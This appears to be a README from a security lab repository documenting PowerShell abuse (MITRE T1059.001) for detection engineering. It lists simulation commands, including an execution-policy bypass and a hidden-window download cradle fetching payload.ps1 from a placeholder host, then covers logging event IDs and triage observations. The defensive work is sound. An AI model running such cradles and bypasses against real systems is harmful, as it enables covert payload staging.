# T1059.001 — PowerShell Abuse

**Tactic:** Execution  
**MITRE Link:** https://attack.mitre.org/techniques/T1059/001/  
**Status:** ✅ Complete

---

## Why Attackers Use This

PowerShell is a built-in Windows administration tool, making it trusted by default and rarely blocked. Attackers abuse it to:
- Download and execute payloads directly in memory (fileless malware)
- Bypass execution policies using built-in flags (`-ExecutionPolicy Bypass`)
- Obfuscate commands using Base64 encoding (`-EncodedCommand`)
- Operate in hidden windows to avoid user visibility (`-WindowStyle Hidden`)
- Avoid leaving disk artifacts by running scripts entirely in memory

PowerShell is present in virtually every Windows environment, logs are disabled by default in many organizations, and it has direct access to the .NET framework and Windows APIs — making it a top choice for initial access payloads, C2 communication, and lateral movement staging.

**Real-world threat groups using this technique:** APT29, Lazarus Group, FIN7, Cobalt Strike operators.

---

## Attack Scenario

Simulating a threat actor who has gained initial foothold and uses PowerShell to:
1. Execute encoded commands to evade signature-based detection
2. Bypass execution policy to run unsigned scripts
3. Use a download cradle to stage a payload from a remote server
4. Run with hidden window and no profile to reduce noise

---

## Attack Commands Executed

```powershell
# Encoded command (Base64 obfuscation)
powershell -EncodedCommand JABjACAAPQAgACcASABlAGwAbABvACcA

# Execution policy bypass
powershell -ExecutionPolicy Bypass -Command "whoami"

# Hidden window + download cradle
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri http://example.com/payload.ps1"

# NoProfile + NonInteractive (common in malware droppers)
powershell -NoProfile -NonInteractive -Command "Get-Process"
```

---

## Logs Generated

See [logs-observed.md](./logs-observed.md) for raw log evidence from the lab.

| Log Source | Event ID | Description |
|------------|----------|-------------|
| PowerShell Operational | 4104 | Script block logging — captures full script content |
| PowerShell Operational | 4103 | Module logging — captures pipeline execution |
| Windows Security | 4688 | Process creation with command line arguments |
| Sysmon | 1 | Process create — captures full command line + parent process |

---

## Detection

- **Sigma Rule:** [sigma-rule.yml](./sigma-rule.yml)
- **Splunk SPL:** [splunk-spl.txt](./splunk-spl.txt)
- **Tuning Notes:** [tuning-notes.md](./tuning-notes.md)

---

## Screenshots

See [screenshots/](./) for lab evidence.

---

## My Observations

The first thing I discovered is that Windows logs almost nothing by default. Before I even ran a single attack command, I had to enable process creation auditing via `auditpol`, enable command line logging via registry, and turn on Script Block Logging in Group Policy. Without those steps — which most default Windows installs skip — Event 4688 shows you a process was created but hides the command line entirely. Useless for detection.

The `-EncodedCommand` flag surprised me with how transparent it actually is. I expected it to hide the payload from logs. It doesn't — 4104 decodes Base64 before logging, so the actual script content is always visible. The encoding only defeats signature detection on the command line itself, not 4104.

Event 4103 (Module Logging) ended up being the lowest value of the three log sources. It generated a lot of background noise from system PowerShell activity but wasn't specific to the attack commands I ran. For this technique, 4104 is the one to focus on. I kept 4103 in the documentation for completeness but I wouldn't build a high-fidelity alert on it.

The parent process field in Event 4688 is what makes triage fast. PowerShell spawned by `powershell.exe` is normal (nested shells happen). PowerShell spawned by `winword.exe` or `excel.exe` is an immediate critical — that's a phishing payload executing.
